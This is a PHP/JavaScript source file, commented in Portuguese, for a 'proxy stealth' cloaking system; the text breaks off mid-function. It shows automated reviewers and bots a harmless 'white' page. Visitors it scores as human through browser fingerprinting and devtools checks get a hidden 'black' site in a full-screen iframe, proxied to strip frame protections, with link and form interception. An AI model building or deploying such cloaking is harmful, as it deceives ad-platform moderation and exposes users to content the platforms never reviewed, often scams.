<?php
/**
 * PROXY STEALTH - Shadow DOM + Iframe Overlay
 * 
 * DETECCAO 100% PASSIVA - humano so espera, nao precisa fazer nada
 * Analisa fingerprint do navegador para detectar bots automaticamente
 * 
 * Codigo fonte = WHITE (o que bot le)
 * Visual = BLACK para humanos (via Shadow DOM)
 */

error_reporting(0);
ini_set('display_errors', 0);

function proxyStealthRequest($whiteUrl, $blackUrl, $isInternalNav = false) {
    
    if (empty($whiteUrl) || empty($blackUrl)) {
        http_response_code(400);
        die('URLs nao especificadas');
    }
    
    // Suporta navegacao interna via parametro _blacknav
    if (isset($_GET['_blacknav']) && !empty($_GET['_blacknav'])) {
        $decoded = base64_decode($_GET['_blacknav']);
        if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_URL)) {
            $blackUrl = $decoded;
            $isInternalNav = true;
        }
    }
    
    // Garante protocolo
    if (!preg_match('/^https?:\/\//', $whiteUrl)) {
        $whiteUrl = 'https://' . $whiteUrl;
    }
    if (!preg_match('/^https?:\/\//', $blackUrl)) {
        $blackUrl = 'https://' . $blackUrl;
    }
    
    // =====================================================
    // NAVEGACAO INTERNA - Pula verificacao, serve black direto
    // =====================================================
    if ($isInternalNav) {
        // Serve o black diretamente via iframe, sem re-verificar
        serveBlackDirectly($whiteUrl, $blackUrl);
        return;
    }
    
    // Busca conteudo da WHITE page (isso vai no codigo fonte)
    $whiteContent = fetchContent($whiteUrl);
    
    if ($whiteContent === false) {
        $whiteHtml = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loja</title></head><body><h1>Bem-vindo a nossa loja</h1><p>Carregando produtos...</p></body></html>';
    } else {
        $whiteHtml = $whiteContent['content'];
    }
    
    // Cria URL do iframeproxy para black (remove X-Frame-Options)
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $proxyBase = $protocol . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']);
    $scriptName = basename($_SERVER['SCRIPT_NAME']);
    
    // URL base do proxy para navegacao (proxy-stealth)
    $currentUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $proxyNavBase = $currentUrl . '?white=' . urlencode($whiteUrl) . '&black=';
    
    // URL do iframe - passa proxyBase para que o script de navegacao saiba redirecionar no parent
    $blackProxyUrl = $proxyBase . '/api.php?action=iframeproxy&url=' . urlencode($blackUrl) . '&proxyBase=' . urlencode($proxyNavBase);
    
    // Injeta sistema stealth
    $finalHtml = injectStealthSystem($whiteHtml, $whiteUrl, $blackUrl, $blackProxyUrl, $proxyNavBase);
    
    header('Content-Type: text/html; charset=UTF-8');
    echo $finalHtml;
    exit;
}

/**
 * Serve o black diretamente (para navegacao interna)
 * Nao faz verificacao de bot - usuario ja foi validado antes
 */
function serveBlackDirectly($whiteUrl, $blackUrl) {
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $proxyBase = $protocol . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']);
    
    // URL base do proxy para navegacao
    $currentUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $proxyNavBase = $currentUrl . '?white=' . urlencode($whiteUrl) . '&black=';
    
    // URL do iframe com proxyBase para navegacao
    $blackProxyUrl = $proxyBase . '/api.php?action=iframeproxy&url=' . urlencode($blackUrl) . '&proxyBase=' . urlencode($proxyNavBase);
    
    // HTML minimo que mostra o black em iframe fullscreen
    // Sem verificacao de bot, sem monitoramento
    $html = '<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { width: 100%; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <iframe src="' . htmlspecialchars($blackProxyUrl) . '" allowfullscreen allow="payment; clipboard-write; autoplay"></iframe>
</body>
</html>';
    
    header('Content-Type: text/html; charset=UTF-8');
    echo $html;
    exit;
}

function fetchContent($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
    ]);
    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode >= 400 || $content === false) return false;
    return ['content' => $content];
}

function injectStealthSystem($whiteHtml, $whiteUrl, $blackUrl, $blackProxyUrl = null, $proxyNavBase = null) {
  
  // Usa proxy URL se disponivel (evita X-Frame-Options), senao usa direto
  $iframeUrl = $blackProxyUrl ?: $blackUrl;
  $blackUrlJs = json_encode($iframeUrl);
  
  // Extrai o host base do black para validar links internos
  $blackParsed = parse_url($blackUrl);
  $blackHost = $blackParsed['host'] ?? '';
  $blackOrigin = ($blackParsed['scheme'] ?? 'https') . '://' . $blackHost;
  
  // URL base para navegacao via proxy
  $proxyNavBaseJs = json_encode($proxyNavBase ?: '');
  $blackOriginJs = json_encode($blackOrigin);
  $blackHostJs = json_encode($blackHost);
    
    // CSS do sistema
    $css = <<<CSS
<style id="__s_css">
#__s_overlay {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #0f0f1a 100%);
    z-index: 2147483647;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
}
#__s_overlay .loader {
    width: 60px; height: 60px;
    border: 3px solid rgba(59, 130, 246, 0.2);
    border-top-color: #3b82f6;
    border-radius: 50%;
    animation: __s_spin 0.8s linear infinite;
}
#__s_overlay .msg {
    color: #e2e8f0;
    margin-top: 24px;
    font-size: 18px;
    font-weight: 500;
}
#__s_overlay .sub {
    color: #64748b;
    margin-top: 8px;
    font-size: 14px;
}
#__s_overlay .dots::after {
    content: '';
    animation: __s_dots 1.5s infinite;
}
@keyframes __s_spin { to { transform: rotate(360deg); } }
@keyframes __s_dots {
    0%, 20% { content: '.'; }
    40% { content: '..'; }
    60%, 100% { content: '...'; }
}
#__s_host {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    z-index: 2147483646;
    display: none;
}
</style>
CSS;

    // Overlay HTML
    $overlay = <<<HTML
<div id="__s_overlay">
    <div class="loader"></div>
    <div class="msg">Verificando seu navegador</div>
    <div class="sub">Por favor, aguarde<span class="dots"></span></div>
</div>
<div id="__s_host"></div>
HTML;

    // JavaScript com deteccao PASSIVA + NAVEGACAO INTERNA
    $js = <<<JS
<script id="__s_js">
(function() {
    var BLACK = {$blackUrlJs};
    var BLACK_ORIGIN = {$blackOriginJs};
    var BLACK_HOST = {$blackHostJs};
    var PROXY_NAV_BASE = {$proxyNavBaseJs};
    var botScore = 0;
    var reasons = [];
    
    // ==========================================
    // FUNCAO DE NAVEGACAO - Atualiza URL do proxy
    // quando usuario clica em links dentro do black
    // ==========================================
    
    function navigateToBlackUrl(newUrl) {
        console.log('[Nav] Navegando para:', newUrl);
        
        // Constroi nova URL do proxy
        var newProxyUrl = PROXY_NAV_BASE + encodeURIComponent(newUrl);
        
        // Atualiza URL do navegador e recarrega
        window.location.href = newProxyUrl;
    }
    
    function resolveUrl(href, baseOrigin) {
        if (!href) return null;
        
        // Ignora links especiais
        if (/^(javascript:|mailto:|tel:|#|data:|blob:)/i.test(href)) {
            return null;
        }
        
        // URL absoluta
        if (/^https?:\/\//i.test(href)) {
            return href;
        }
        
        // Protocol-relative
        if (href.indexOf('//') === 0) {
            return 'https:' + href;
        }
        
        // Absoluta do root
        if (href.indexOf('/') === 0) {
            return baseOrigin + href;
        }
        
        // Relativa - precisa do path atual
        // Por simplicidade, assume root
        return baseOrigin + '/' + href;
    }
    
    function isInternalLink(url) {
        if (!url) return false;
        try {
            var parsed = new URL(url);
            return parsed.host === BLACK_HOST || parsed.host.endsWith('.' + BLACK_HOST);
        } catch(e) {
            return false;
        }
    }
    
    // ==========================================
    // DETECCAO 100% PASSIVA
    // Humano nao precisa fazer NADA
    // Analisa propriedades do navegador
    // ==========================================
    
    function detect() {
        
        // 1. WebDriver (Selenium, Puppeteer, Playwright)
        if (navigator.webdriver === true) {
            botScore += 100;
            reasons.push('webdriver');
        }
        
        // 2. Propriedades de automacao
        var dominated = [
            '__webdriver_evaluate', '__selenium_evaluate', '__webdriver_script_function',
            '__webdriver_script_func', '__webdriver_script_fn', '__fxdriver_evaluate',
            '__driver_unwrapped', '__webdriver_unwrapped', '__driver_evaluate',
            '__selenium_unwrapped', '__fxdriver_unwrapped', '_Selenium_IDE_Recorder',
            '_selenium', 'calledSelenium', '_WEBDRIVER_ELEM_CACHE', 'ChromeDriverw',
            '__nightmare', '__phantomas', 'callPhantom', '_phantom', 'phantom',
            '__playwright', 'playwright', 'domAutomation', 'domAutomationController'
        ];
        
        for (var i = 0; i < dominated.length; i++) {
            if (window[dominated[i]] !== undefined) {
                botScore += 100;
                reasons.push(dominated[i]);
            }
        }
        
        // 3. Document webdriver attribute
        if (document.documentElement.getAttribute('webdriver')) {
            botScore += 100;
            reasons.push('doc_webdriver');
        }
        
        // 4. HeadlessChrome no UA
        if (/HeadlessChrome/i.test(navigator.userAgent)) {
            botScore += 100;
            reasons.push('headless_ua');
        }
        
        // 5. Chrome sem chrome object (ignora mobile - Chrome mobile pode nao ter)
        if (/Chrome/.test(navigator.userAgent) && !window.chrome && !/Mobile|Android/i.test(navigator.userAgent)) {
            botScore += 50;
            reasons.push('no_chrome_obj');
        }
        
        // 6. Plugins zerados (headless geralmente tem 0)
        if (navigator.plugins && navigator.plugins.length === 0) {
            // So conta se for Chrome desktop (mobile pode ter 0)
            if (/Chrome/.test(navigator.userAgent) && !/Mobile|Android/i.test(navigator.userAgent)) {
                botScore += 30;
                reasons.push('no_plugins');
            }
        }
        
        // 7. Languages vazias
        if (!navigator.languages || navigator.languages.length === 0) {
            botScore += 50;
            reasons.push('no_languages');
        }
        
        // 8. Screen zerado
        if (screen.width === 0 || screen.height === 0 || screen.availWidth === 0) {
            botScore += 100;
            reasons.push('no_screen');
        }
        
        // 9. Canvas fingerprint falho
        try {
            var c = document.createElement('canvas');
            var ctx = c.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjord', 2, 15);
            var d = c.toDataURL();
            if (d === 'data:,' || d.length < 100) {
                botScore += 40;
                reasons.push('canvas_fail');
            }
        } catch(e) {
            botScore += 20;
            reasons.push('canvas_error');
        }
        
        // 10. WebGL SwiftShader (indica headless)
        try {
            var c2 = document.createElement('canvas');
            var gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
            if (gl) {
                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                    if (/SwiftShader|llvmpipe|softpipe/i.test(renderer)) {
                        botScore += 60;
                        reasons.push('swiftshader');
                    }
                }
            }
        } catch(e) {}
        
        // 11. Timezone indefinida
        try {
            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (!tz || tz === 'undefined') {
                botScore += 30;
                reasons.push('no_timezone');
            }
        } catch(e) {
            botScore += 20;
            reasons.push('tz_error');
        }
        
        // 12. DevTools aberto (revisao manual) - ignora em mobile
        var devtools = false;
        if (!/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
            var devThreshold = 160;
            if (window.outerWidth - window.innerWidth > devThreshold || 
                window.outerHeight - window.innerHeight > devThreshold) {
                devtools = true;
                botScore += 80;
                reasons.push('devtools');
            }
        }
        
        // 13. Connection RTT zero
        if (navigator.connection && navigator.connection.rtt === 0) {
            botScore += 40;
            reasons.push('rtt_zero');
        }
        
        // 14. UA suspeito
        var ua = navigator.userAgent.toLowerCase();
        var bots = ['bot', 'crawl', 'spider', 'scrape', 'headless', 'phantom', 'selenium', 
                    'webdriver', 'puppeteer', 'playwright', 'wget', 'curl', 'python', 
                    'java/', 'httpclient', 'okhttp', 'apache-http', 'go-http'];
        for (var j = 0; j < bots.length; j++) {
            if (ua.indexOf(bots[j]) !== -1) {
                botScore += 100;
                reasons.push('ua_' + bots[j]);
                break;
            }
        }
        
        // 15. Permissions API ausente em Chrome moderno
        if (/Chrome\/[89]\d|Chrome\/1[0-2]\d/.test(navigator.userAgent) && !navigator.permissions) {
            botScore += 30;
            reasons.push('no_permissions');
        }
        
        // 16. Inconsistencia touch/mobile
        var hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        var mobileUA = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        if (mobileUA && !hasTouch) {
            botScore += 70;
            reasons.push('mobile_no_touch');
        }
        
        // 17. CDP traces (Chrome DevTools Protocol)
        var cdcKeys = Object.keys(window).filter(function(k) {
            return k.indexOf('cdc_') === 0 || k.indexOf('$cdc_') === 0;
        });
        if (cdcKeys.length > 0) {
            botScore += 100;
            reasons.push('cdp_traces');
        }
        
        // 18. Notification API
        if (typeof Notification === 'undefined') {
            // OK em mobile, suspeito em desktop
            if (!/Mobile|Android/i.test(navigator.userAgent)) {
                botScore += 20;
                reasons.push('no_notification');
            }
        }
        
        // 19. Audio context (bots geralmente nao tem) - ignora mobile
        try {
            var AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext && !/Mobile|Android/i.test(navigator.userAgent)) {
                botScore += 20;
                reasons.push('no_audio');
            }
        } catch(e) {}
        
        // 20. Battery API inconsistencia
        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                if (b.charging && b.chargingTime === 0 && b.level === 1) {
                    botScore += 15;
                }
            }).catch(function(){});
        }
        
        // ==========================================
        // DETECCOES AVANCADAS - Dificeis de falsificar
        // ==========================================
        
        // 21. Prototype tampering - bots modificam prototypes
        try {
            var origToString = Function.prototype.toString;
            var result = origToString.call(navigator.permissions.query);
            if (!/native code/.test(result)) {
                botScore += 60;
                reasons.push('proto_tamper');
            }
        } catch(e) {}
        
        // 22. Error stack trace - headless tem stacks diferentes
        try {
            throw new Error('test');
        } catch(e) {
            if (e.stack && /phantomjs|ghost|nightmare/i.test(e.stack)) {
                botScore += 100;
                reasons.push('error_stack');
            }
        }
        
        // 23. Performance.now() precision - bots tem precisao diferente
        var t1 = performance.now();
        var t2 = performance.now();
        var t3 = performance.now();
        // Se todas iguais (sem variacao), suspeito
        if (t1 === t2 && t2 === t3) {
            botScore += 30;
            reasons.push('perf_precision');
        }
        
        // 24. Propriedade navigator.vendor vazia
        if (!navigator.vendor || navigator.vendor === '') {
            botScore += 40;
            reasons.push('no_vendor');
        }
        
        // 25. Chrome mas vendor nao e Google
        if (/Chrome/.test(navigator.userAgent) && navigator.vendor !== 'Google Inc.') {
            if (!/Mobile|Android/i.test(navigator.userAgent)) {
                botScore += 50;
                reasons.push('wrong_vendor');
            }
        }
        
        // 26. Inconsistencia platform vs UA
        var plat = navigator.platform || '';
        if (/Windows/.test(navigator.userAgent) && !/Win/.test(plat)) {
            botScore += 70;
            reasons.push('plat_mismatch');
        }
        if (/Mac/.test(navigator.userAgent) && !/Mac/.test(plat)) {
            botScore += 70;
            reasons.push('plat_mismatch');
        }
        if (/Linux/.test(navigator.userAgent) && !/Linux/.test(plat) && !/Android/i.test(navigator.userAgent)) {
            botScore += 70;
            reasons.push('plat_mismatch');
        }
        
        // 27. History length = 1 (primeira visita, comum em bots)
        if (window.history && window.history.length <= 1) {
            botScore += 20;
            reasons.push('history_1');
        }
        
        // 28. Iframe detection - bots rodam em contexto isolado
        try {
            if (window.self !== window.top && !document.referrer) {
                botScore += 25;
                reasons.push('iframe_no_ref');
            }
        } catch(e) {}
        
        // 29. Speechsynthesis voices (bots geralmente tem 0)
        if (window.speechSynthesis) {
            var voices = window.speechSynthesis.getVoices();
            if (voices.length === 0) {
                // Da um tempo para carregar
                setTimeout(function() {
                    if (window.speechSynthesis.getVoices().length === 0) {
                        botScore += 15;
                    }
                }, 100);
            }
        }
        
        // 30. Deteccao de Puppeteer stealth mode
        // Puppeteer-extra-stealth deixa rastros
        if (window.navigator.plugins.namedItem && 
            window.navigator.plugins.namedItem('Chrome PDF Plugin') === null &&
            /Chrome/.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent)) {
            botScore += 35;
            reasons.push('no_pdf_plugin');
        }
        
        // 31. Memory info (apenas Chrome)
        if (window.performance && performance.memory) {
            // Valores muito baixos indicam ambiente controlado
            if (performance.memory.jsHeapSizeLimit < 1000000) {
                botScore += 40;
                reasons.push('low_memory');
            }
        }
        
        // 32. Numero de cores do CPU muito baixo
        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 2) {
            botScore += 30;
            reasons.push('low_cores');
        }
        
        // 33. DeviceMemory muito baixa
        if (navigator.deviceMemory && navigator.deviceMemory < 1) {
            botScore += 30;
            reasons.push('low_device_mem');
        }
        
        // 34. WebRTC leak check - bots geralmente bloqueiam
        var hasWebRTC = !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection);
        if (!hasWebRTC && /Chrome/.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent)) {
            botScore += 40;
            reasons.push('no_webrtc');
        }
        
        // 35. Accelerometer API - mobile real tem, emulador nao
        var mobileUA = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
        if (mobileUA && !window.DeviceMotionEvent) {
            botScore += 50;
            reasons.push('no_accel');
        }
        
        return { score: botScore, reasons: reasons };
    }
    
    // ==========================================
    // VERIFICA ACELEROMETRO (MOBILE REAL vs EMULADOR)
    // ==========================================
    
    var accelData = [];
    var accelHandler = function(e) {
        if (e.accelerationIncludingGravity) {
            var x = e.accelerationIncludingGravity.x || 0;
            var y = e.accelerationIncludingGravity.y || 0;
            var z = e.accelerationIncludingGravity.z || 0;
            accelData.push({x: x, y: y, z: z});
        }
    };
    
    // Escuta por 1.5 segundos
    if (window.DeviceMotionEvent) {
        window.addEventListener('devicemotion', accelHandler, true);
    }
    
    // ==========================================
    // DECISAO APOS 2 SEGUNDOS
    // ==========================================
    
    setTimeout(function() {
        // Para de escutar acelerometro
        if (window.DeviceMotionEvent) {
            window.removeEventListener('devicemotion', accelHandler, true);
        }
        
        var overlay = document.getElementById('__s_overlay');
        var host = document.getElementById('__s_host');
        
        // SEMPRE faz verificacao - bots TikTok usam emulador mobile
        var result = detect();
        
        // Detecta mobile real vs emulador
        var isMobile = /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent);
        var hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        
        // Verifica se acelerometro retornou dados REAIS
        var hasRealAccel = false;
        if (accelData.length > 3) {
            // Verifica se ha variacao nos dados (celular real tem micro-movimentos)
            var xSum = 0, ySum = 0, zSum = 0;
            for (var i = 0; i < accelData.length; i++) {
                xSum += Math.abs(accelData[i].x);
                ySum += Math.abs(accelData[i].y);
                zSum += Math.abs(accelData[i].z);
            }
            // Se tem leituras e valores razoaveis (gravidade ~9.8)
            if ((xSum > 0 || ySum > 0 || zSum > 5) && zSum < 500) {
                hasRealAccel = true;
            }
        }
        
        // Threshold baseado no contexto
        var threshold = 40; // Desktop: mais rigoroso
        
        // Mobile REAL com acelerometro funcionando = threshold maior
        if (isMobile && hasTouch && hasRealAccel) {
            threshold = 100; // Humano real, so bloqueia se certeza total
            console.log('[Check] Mobile REAL detectado (accel funcionando)');
        } else if (isMobile && hasTouch) {
            // Mobile mas sem acelerometro real = SUSPEITO (emulador)
            result.score += 40;
            result.reasons.push('mobile_no_real_accel');
            threshold = 50;
            console.log('[Check] Mobile EMULADOR suspeito (sem accel real)');
        }
        
        var isBot = result.score >= threshold;
        console.log('[Check] Score:', result.score, 'Threshold:', threshold, 'Bot:', isBot, 'AccelData:', accelData.length, 'Reasons:', result.reasons.join(','));
        
        if (isBot) {
            // BOT - remove overlay, mostra WHITE (que ja esta no HTML)
            console.log('[Check] Bot detectado');
            if (overlay) {
                overlay.style.transition = 'opacity 0.3s';
                overlay.style.opacity = '0';
                setTimeout(function() { overlay.remove(); }, 300);
            }
            if (host) host.remove();
        } else {
            // HUMANO - mostra BLACK via iframe (URL nao muda)
            console.log('[Check] Humano - mostrando black via iframe');
            
            // Cria iframe que cobre toda a tela
            var iframe = document.createElement('iframe');
            iframe.src = BLACK;
            iframe.id = '__black_iframe';
            iframe.name = '__black_iframe';
            iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:2147483646;background:#fff;';
            iframe.setAttribute('allowfullscreen', 'true');
            iframe.setAttribute('allow', 'payment; clipboard-write; autoplay');
            
            // ==========================================
            // INTERCEPTACAO DE NAVEGACAO DENTRO DO IFRAME
            // Quando usuario clica em link, atualiza URL do proxy
            // ==========================================
            
            var lastIframeUrl = BLACK;
            var navigationCheckInterval = null;
            
            function setupIframeNavigation() {
                try {
                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    var iframeWin = iframe.contentWindow;
                    
                    console.log('[Nav] Configurando interceptacao de navegacao');
                    
                    // Intercepta cliques em links
                    iframeDoc.addEventListener('click', function(e) {
                        var target = e.target.closest('a');
                        if (!target) return;
                        
                        var href = target.getAttribute('href');
                        if (!href) return;
                        
                        // Resolve URL
                        var fullUrl = resolveUrl(href, BLACK_ORIGIN);
                        
                        if (!fullUrl) return; // Link especial (javascript:, mailto:, etc)
                        
                        // Se for link interno do black, navega pelo proxy
                        if (isInternalLink(fullUrl)) {
                            e.preventDefault();
                            e.stopPropagation();
                            console.log('[Nav] Link interno clicado:', fullUrl);
                            navigateToBlackUrl(fullUrl);
                            return false;
                        }
                        
                        // Link externo - deixa abrir normalmente (em nova aba)
                        console.log('[Nav] Link externo:', fullUrl);
                        target.setAttribute('target', '_blank');
                    }, true);
                    
                    // Intercepta submissao de formularios
                    iframeDoc.addEventListener('submit', function(e) {
                        var form = e.target;
                        if (form.tagName !== 'FORM') return;
                        
                        var action = form.getAttribute('action') || '';
                        var method = (form.getAttribute('method') || 'GET').toUpperCase();
                        
                        // Resolve URL do action
                        var fullUrl = resolveUrl(action, BLACK_ORIGIN);
                        
                        if (!fullUrl) {
                            fullUrl = BLACK_ORIGIN + '/';
                        }
                        
                        // Para GET, constroi URL com parametros
                        if (method === 'GET' && isInternalLink(fullUrl)) {
                            e.preventDefault();
                            e.stopPropagation();
                            
                            var formData = new FormData(form);
                            var params = new URLSearchParams(formData).toString();
                            var separator = fullUrl.indexOf('?') !== -1 ? '&' : '?';
                            var finalUrl = fullUrl + (params ? separator + params : '');
                            
                            console.log('[Nav] Form GET:', finalUrl);
                            navigateToBlackUrl(finalUrl);
                            return false;
                        }
                        
                        // Para POST em links internos, tambem redireciona (limitacao: perde dados POST)
                        // Alternativa: poderia usar AJAX, mas e mais complexo
                        if (method === 'POST' && isInternalLink(fullUrl)) {
                            console.log('[Nav] Form POST para:', fullUrl);
                            // Por enquanto, deixa o form submeter normalmente
                            // O iframe vai navegar, mas a URL do proxy nao vai mudar
                            // Podemos detectar isso pelo monitoramento abaixo
                        }
                    }, true);
                    
                    // Monitora mudancas de URL dentro do iframe (ex: navegacao via JS)
                    var currentIframeHref = '';
                    try {
                        currentIframeHref = iframeWin.location.href;
                    } catch(e) {}
                    
                    if (navigationCheckInterval) {
                        clearInterval(navigationCheckInterval);
                    }
                    
                    navigationCheckInterval = setInterval(function() {
                        try {
                            var newHref = iframeWin.location.href;
                            if (newHref && newHref !== currentIframeHref && newHref !== 'about:blank') {
                                console.log('[Nav] URL do iframe mudou:', newHref);
                                currentIframeHref = newHref;
                                
                                // Extrai URL real do parametro url= do proxy
                                var match = newHref.match(/[?&]url=([^&]+)/);
                                if (match) {
                                    var realUrl = decodeURIComponent(match[1]);
                                    if (isInternalLink(realUrl)) {
                                        // Atualiza URL do navegador sem recarregar
                                        var newProxyUrl = PROXY_NAV_BASE + encodeURIComponent(realUrl);
                                        if (window.history && window.history.replaceState) {
                                            window.history.replaceState(null, '', newProxyUrl);
                                            console.log('[Nav] URL atualizada:', newProxyUrl);
                                        }
                                    }
                                }
                            }
                        } catch(e) {
                            // Cross-origin - nao consegue acessar location do iframe
                        }
                    }, 500);
                    
                } catch(e) {
                    console.log('[Nav] Erro ao configurar navegacao (cross-origin?):', e.message);
                }
            }
            
            // Quando carregar, remove o overlay de verificacao
            iframe.onload = function() {
                console.log('[Check] Iframe carregado');
                if (overlay) {
                    overlay.style.transition = 'opacity 0.3s';
                    overlay.style.opacity = '0';
                    setTimeout(function() { overlay.remove(); }, 300);
                }
                
                // Configura interceptacao de navegacao
                setupIframeNavigation();
                
                // ==========================================
                // MONITORAMENTO CONTINUO POS-IFRAME
                // Se detectar comportamento de bot, redireciona para white
                // ==========================================
                startContinuousMonitoring();
            };
            
            // Adiciona iframe ao body
            document.body.appendChild(iframe);
            
            // Remove host nao usado
            if (host) host.remove();
        }
    }, 2000);
    
    // ==========================================
    // FUNCAO DE MONITORAMENTO CONTINUO
    // DESATIVADO TEMPORARIAMENTE - estava causando redirecionamento incorreto
    // ==========================================
    function startContinuousMonitoring() {
        console.log('[Monitor] Monitoramento continuo DESATIVADO');
        return; // DESATIVADO - remova esta linha para reativar
        
        var botIndicators = 0;
        var iframeBotScore = 0; // Score recebido do iframe via postMessage
        var monitorStart = Date.now();
        var monitorDuration = 15000; // 15 segundos (aumentado para dar tempo ao iframe)
        var lastMousePos = null;
        var mouseMovements = [];
        var scrollEvents = [];
        var clickEvents = [];
        var whiteUrl = location.href.split('&black=')[0].split('white=')[1];
        if (whiteUrl) whiteUrl = decodeURIComponent(whiteUrl.split('&')[0]);
        
        // ==========================================
        // LISTENER PARA RECEBER DADOS DO IFRAME
        // O script injetado no black envia dados comportamentais
        // ==========================================
        
        var behaviorReportsReceived = 0;
        var totalIframeScore = 0;
        
        window.addEventListener('message', function(event) {
            // Verifica se e um relatorio de comportamento
            if (!event.data || event.data.type !== '__BEHAVIOR_REPORT__') return;
            
            behaviorReportsReceived++;
            var report = event.data;
            
            // Log detalhado do relatorio
            console.log('[Monitor] Relatorio do iframe #' + behaviorReportsReceived + ':', 
                'Score:', report.score, 
                'DataPoints:', JSON.stringify(report.dataPoints || {}));
            
            // Se tem flags (tracker-behavioral.js completo)
            if (report.flags) {
                console.log('[Monitor] Flags:', JSON.stringify(report.flags));
                
                // APENAS deteccoes CRITICAS aumentam score
                // Webdriver e automacao sao sinais claros de bot
                if (report.flags.webdriver) {
                    console.log('[Monitor] CRITICO: Webdriver detectado!');
                    iframeBotScore = 200; // Forca deteccao
                }
                if (report.flags.automation) {
                    console.log('[Monitor] CRITICO: Automacao detectada:', report.flags.automation);
                    iframeBotScore = 200; // Forca deteccao
                }
                if (report.flags.headless) {
                    console.log('[Monitor] ALERTA: Headless browser detectado');
                    iframeBotScore = Math.max(iframeBotScore, 150);
                }
            }
            
            // Acumula score do iframe (apenas se nao foi forcado)
            if (iframeBotScore < 150) {
                iframeBotScore = report.score; // Usa ultimo score, nao acumula
            }
            
            // NAO penaliza por:
            // - Score alto em relatorio individual (pode ser falso positivo)
            // - Pouco movimento de mouse (mobile nao tem mouse)
            // - Cliques sem mouse (touchscreen)
            
            // APENAS monitora para log
            var mouseCount = report.dataPoints ? (report.dataPoints.mouse || report.dataPoints.mouseMoves || 0) : 0;
            var clickCount = report.dataPoints ? (report.dataPoints.click || report.dataPoints.clicks || 0) : 0;
            
            console.log('[Monitor] Mouse:', mouseCount, 'Clicks:', clickCount, 'Elapsed:', report.elapsed);
            
        }, false);
        
        // 1. Monitora movimentos do mouse (bots tem padroes lineares)
        var mouseHandler = function(e) {
            var pos = {x: e.clientX, y: e.clientY, t: Date.now()};
            mouseMovements.push(pos);
            
            // Mantem apenas ultimos 20 movimentos
            if (mouseMovements.length > 20) mouseMovements.shift();
            
            // Analisa padrao a cada 10 movimentos
            if (mouseMovements.length >= 10) {
                // Verifica se movimento e perfeitamente linear (bot)
                var isLinear = checkLinearMovement(mouseMovements.slice(-10));
                if (isLinear) {
                    botIndicators += 30;
                    console.log('[Monitor] Movimento linear detectado');
                }
                
                // Verifica velocidade impossivel
                var speed = checkMouseSpeed(mouseMovements.slice(-5));
                if (speed > 10000) { // pixels por segundo
                    botIndicators += 25;
                    console.log('[Monitor] Velocidade impossivel:', speed);
                }
            }
        };
        
        // 2. Monitora scroll (bots scrollam de forma mecanica)
        var scrollHandler = function(e) {
            scrollEvents.push({y: window.scrollY, t: Date.now()});
            
            if (scrollEvents.length > 5) scrollEvents.shift();
            
            // Verifica scroll instantaneo para posicoes exatas
            if (scrollEvents.length >= 3) {
                var lastThree = scrollEvents.slice(-3);
                var dt = lastThree[2].t - lastThree[0].t;
                var dy = Math.abs(lastThree[2].y - lastThree[0].y);
                
                // Scroll muito grande em tempo muito curto
                if (dy > 2000 && dt < 50) {
                    botIndicators += 20;
                    console.log('[Monitor] Scroll instantaneo detectado');
                }
            }
        };
        
        // 3. Monitora cliques (apenas padroes MUITO obvios de automacao)
        var clickHandler = function(e) {
